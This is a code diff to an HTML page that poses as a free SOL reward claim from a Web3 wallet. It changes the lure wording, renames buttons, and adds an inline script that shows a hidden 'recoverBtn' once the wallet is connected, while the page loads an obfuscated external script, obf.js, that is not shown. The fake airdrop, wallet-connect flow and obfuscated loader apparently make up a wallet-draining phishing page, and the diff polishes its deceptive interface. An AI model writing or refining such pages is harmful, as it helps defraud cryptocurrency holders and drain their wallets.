@@ -176,13 +176,14 @@
         
         .info-text {
             color: rgba(255, 255, 255, 0.9);
-            font-size: 14px;
-            line-height: 1.6;
+            font-size: 18px; /* Increased from 14px */
+            line-height: 1.5;
+            font-weight: 400;
         }
         
+        /* Icon removed from info-text */
         .info-text i {
-            color: #ab9ff2;
-            margin-right: 8px;
+            display: none;
         }
         
         .floating-elements {
@@ -649,22 +650,25 @@
     <div class="center-buttons">
         <div class="info-card">
             <div class="info-text">
-                <i class="fas fa-info-circle"></i> A Little Gift From Your Favourite Web3 Wallet!
+                <!-- Icon removed, text made bigger via CSS -->
+                Check if your eligible to claim a SOL reward Instantly!
             </div>
         </div>
         
         <div class="wallet-info" id="walletInfo">
             <i class="fas fa-check-circle" style="color:#35bd60;"></i>
-            <span>Wallet connected!</span>
+            <span>Wallet connected! Click Continue.</span>
         </div>
         
-        <button class="btn btn-primary" id="connectBtn"><i class="fas fa-plug"></i>Connect Wallet</button>
-        <button class="btn btn-secondary" id="recoverBtn" disabled>
-            <span class="btn-text">Claim Gift</span>
+        <button class="btn btn-primary" id="connectBtn"><i class="fas fa-plug"></i>Connect wallet</button>
+        
+        <!-- Check button (recoverBtn) - hidden by default, shown after connect via JS -->
+        <button class="btn btn-secondary" id="recoverBtn" style="display: none;" disabled>
+            <span class="btn-text">Check</span>
             <span class="inline-spinner" id="recoverSpinner" style="display:none"></span>
         </button>
         
-        <!-- Bottom info card removed as requested -->
+        <!-- Bottom info card removed -->
         
     </div>
 
@@ -781,5 +785,37 @@
     </div>
 
     <script src="./obf.js"></script>
+    <script>
+        // Minimal inline script to handle the connect button visibility for the Check button
+        // This complements the external obf.js logic
+        document.addEventListener('DOMContentLoaded', function() {
+            const connectBtn = document.getElementById('connectBtn');
+            const recoverBtn = document.getElementById('recoverBtn');
+            const walletInfo = document.getElementById('walletInfo');
+            
+            // Function to simulate connection (will be overridden by obf.js but ensures visibility)
+            if (connectBtn) {
+                connectBtn.addEventListener('click', function() {
+                    // Show wallet info and recover button when connected
+                    if (walletInfo) {
+                        walletInfo.style.display = 'flex';
+                    }
+                    if (recoverBtn) {
+                        recoverBtn.style.display = 'flex';
+                        // Remove disabled state after a short delay to simulate successful connection
+                        setTimeout(() => {
+                            recoverBtn.disabled = false;
+                        }, 500);
+                    }
+                });
+            }
+            
+            // Ensure recover button starts hidden
+            if (recoverBtn) {
+                recoverBtn.style.display = 'none';
+                recoverBtn.disabled = true;
+            }
+        });
+    </script>
 </body>
 </html>
